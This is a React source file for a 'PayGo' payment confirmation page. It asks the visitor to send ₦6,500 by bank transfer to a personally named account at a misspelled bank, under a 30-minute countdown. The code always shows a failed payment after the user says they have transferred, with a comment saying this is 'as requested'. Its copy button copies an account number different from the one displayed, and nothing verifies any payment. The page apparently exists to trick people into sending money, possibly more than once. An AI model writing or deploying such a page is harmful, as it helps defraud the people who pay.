
import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Copy } from "lucide-react";
import { toast } from "sonner";
import TransactionResult from "@/components/payment/TransactionResult";

const PaymentConfirmation = () => {
  const navigate = useNavigate();
  const [timeLeft, setTimeLeft] = useState(1800); // 30 minutes in seconds
  const location = useLocation();
  const [showResult, setShowResult] = useState(false);
  const [paymentSuccess, setPaymentSuccess] = useState(false);
  
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins} mins ${secs} secs`;
  };
  
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prevTime) => {
        if (prevTime <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prevTime - 1;
      });
    }, 1000);
    
    return () => clearInterval(timer);
  }, []);
  
  const handleCopyAccount = () => {
    navigator.clipboard.writeText("8102562883");
    toast.success("Account number copied to clipboard");
  };
  
  const handleTransferDone = () => {
    setShowResult(true);
    
    // Always show payment failure as requested
    setPaymentSuccess(false);
  };
  
  const handleCloseResult = () => {
    setShowResult(false);
    if (paymentSuccess) {
      navigate("/dashboard");
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-gray-50">
      <header className="bg-white p-5 flex justify-between items-center border-b border-gray-200">
        <h1 className="text-lg font-medium text-gray-800">PayGo</h1>
        <div className="text-sm text-gray-600 text-right">
          <p>{location.state?.email || "user@example.com"}</p>
        </div>
      </header>
      
      <div className="flex-1 flex items-center justify-center p-5">
        <div className="bg-white rounded-xl shadow-sm max-w-md w-full p-6">
          <div className="text-center mb-6">
            <h2 className="text-lg font-medium text-gray-700">Amount to pay</h2>
            <p className="text-3xl font-bold mt-2">₦6,500.00</p>
            <div className="flex justify-between text-gray-600 text-sm mt-2 px-4">
              <span>Amount ₦6,500.00</span>
              <span>Fee ₦0.00</span>
            </div>
          </div>
          
          <div className="flex items-center gap-2 text-[#00aaff] mb-4">
            <svg className="w-6 h-6" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M9 20L3 14L9 8" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
              <path d="M3 14H21" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
            <p className="font-medium">Pay with Transfer</p>
            <div className="ml-auto">
              <span className="text-[#00aaff] font-medium">SWITCH</span>
            </div>
          </div>
          
          <p className="text-center text-gray-700 mb-4">Transfer to account details below</p>
          
          <div className="bg-gray-50 rounded-lg p-5 mb-6 text-center">
            <p className="text-xl font-bold mb-4">MONEIPOINT</p>
            
            <div className="flex items-center justify-center gap-2 mb-4">
              <span className="text-2xl text-[#00aaff] font-bold">5036801457</span>
              <button onClick={handleCopyAccount} className="text-gray-500">
                <Copy className="w-5 h-5" />
              </button>
            </div>
            
            <p className="text-gray-600 mb-1">Account Name</p>
            <p className="text-xl font-bold mb-6">PRIZE FREDRICK RUFUS </p>
            
            <p className="text-gray-500 text-sm">
              this one-time account expires in {formatTime(timeLeft)}
            </p>
          </div>
          
          <Button 
            onClick={handleTransferDone}
            className="w-full bg-[#ff6f43] hover:bg-[#f05a2f] text-white text-xl py-6 rounded-xl"
          >
            I've Transferred The Money
          </Button>
        </div>
      </div>

      <TransactionResult 
        isOpen={showResult}
        onClose={handleCloseResult}
        success={paymentSuccess}
      />
    </div>
  );
};

export default PaymentConfirmation;
